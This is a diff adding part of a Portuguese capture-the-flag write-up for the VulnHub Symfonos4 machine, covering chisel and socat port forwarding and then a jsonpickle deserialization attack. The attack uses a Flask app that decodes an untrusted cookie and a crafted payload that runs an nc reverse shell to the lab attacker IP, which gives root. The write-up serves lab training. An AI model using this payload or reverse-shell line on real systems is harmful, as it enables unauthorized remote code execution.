@@ -170,12 +170,120 @@ Com o comando **ps -aux | grep 8080** confirmamos isso
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy3.png)
 
+## Port Forwading
+
+Então vamos fazer um port forwading pra nossa máquina dessa porta 8080
+
+### Chisel
+
+Primeiro vamos fazer utilizando o [Chisel](https://github.com/jpillora/chisel)
+
+Baixamos e passamos ele para a máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel.png)
+
+Setamos o Servidor e Cliente
+
+```bash
+# Servidor
+/chisel server --host 192.168.56.102 --port 8000 --reverse
+# Cliente
+/chisel client 192.168.56.102:8000 R:5000:127.0.0.1:8080
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel1.png)
+
+Agora testamos e vemos que podemos acessar a página
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel2.png)
+
+Agora vamos demonstrar outro modo
+
+### SOCAT
+
+Utilizando o socat
+
+```bash
+socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/socat.png)
+
+Agora acessamos a página
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/socat1.png)
+
+## Python Pickles
+
+O que achei estranho foi ele redirecionar pra esse **/whoami**, então resolvi jogar pro burpsuite pra ver como ele se comporta
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp.png)
+
+Decoder, esse username me pareceu ser um base64, confirmamos isso
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp1.png)
+
+Verificamos novamente o que aquele app faz, dentro do **/opt**
+
+```python3
+from flask import Flask, request, render_template, current_app, redirect
+import jsonpickle
+import base64
+app = Flask(__name__)
+class User(object):
+    def __init__(self, username):
+        self.username = username
+@app.route('/')
+def index():
+    if request.cookies.get("username"):
+        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
+        return render_template("index.html", username=u.username)
+    else:
+        w = redirect("/whoami")
+        response = current_app.make_response(w)
+        u = User("Poseidon")
+        encoded = base64.b64encode(jsonpickle.encode(u))
+        response.set_cookie("username", value=encoded)
+        return response
+@app.route('/whoami')
+def whoami():
+    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
+    username = user.username
+    return render_template("whoami.html", username=username)
+if __name__ == '__main__':
+    app.run()
+```
+
+Vemos que ele importa o **Flask**, vamos explorar então
+
+Encontramos esse [Artigo](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/) que abrange bem esse vulnerabilidade e como explorar ela... A vulnerabilidade está na hora em que ele encode e desencoda o base64, se passarmos algum código malicioso dentro dele, ele vai carregar e executar, por cima é mais ou menos isso que está acontecendo.
+
+Então vamos fazer as mudanças necessárias, lembra daquele USERNAME que é um base64 que ele decode, vamos trabalhar com ele
+
+Original:
+
+```
+{"py/object": "app.User", "username": "Poseidon"}
+```
+
+Modificado
+
+```
+{"py/object": "main.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["/usr/bin/nc -e /bin/bash 192.168.56.102 443"]}, null, null, null]}
+```
+
+Encondamos em base64
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp2.png)
+
+Mandamos e viramos root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp3.png)
 
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp.png)
 
-
-
-
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp.png)
 
 
 
